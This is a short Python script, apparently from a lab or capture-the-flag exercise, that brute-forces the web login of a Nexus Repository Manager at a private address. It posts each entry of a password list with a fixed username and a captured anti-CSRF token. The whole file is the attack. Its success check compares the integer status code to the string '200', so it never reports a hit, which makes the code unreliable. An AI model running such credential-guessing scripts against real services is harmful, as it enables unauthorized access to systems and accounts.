#!/usr/bin/python3

import requests

url = 'http://192.168.54.61:8081/service/rapture/session'

myheaders = {"Host" : "192.168.54.61:8081", "User-Agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", 
"Accept" : "*/*", 
"Accept-Language" : "en-US,en;q=0.5", 
"Accept-Encoding" : "gzip, deflate", 
"X-Nexus-UI" : "true", 
"NX-ANTI-CSRF-TOKEN" : "0.9389944782110575", 
"Content-Type" : "application/x-www-form-urlencoded; charset=UTF-8", 
"X-Requested-With" : "XMLHttpRequest", 
"Content-Length" : "31", 
"Origin" : "http://192.168.54.61:8081", 
"Connection" : "keep-alive", 
"Referer" : "http://192.168.54.61:8081/"
}

mycookies = {"Cookie" : "NX-ANTI-CSRF-TOKEN=0.9389944782110575"}


with open('/home/kali/password-encodedurl.lst', ) as file:
    passwords = [line.rstrip() for line in file]


for password in passwords:
    mydata = {"username" : "YWE%3D", "password" : password}
    response = requests.post(url, headers=myheaders, data=mydata, cookies=mycookies)
    if(response.status_code == '200'):
        print("Status code: ", response.status_code)
        print("Password: ", password)
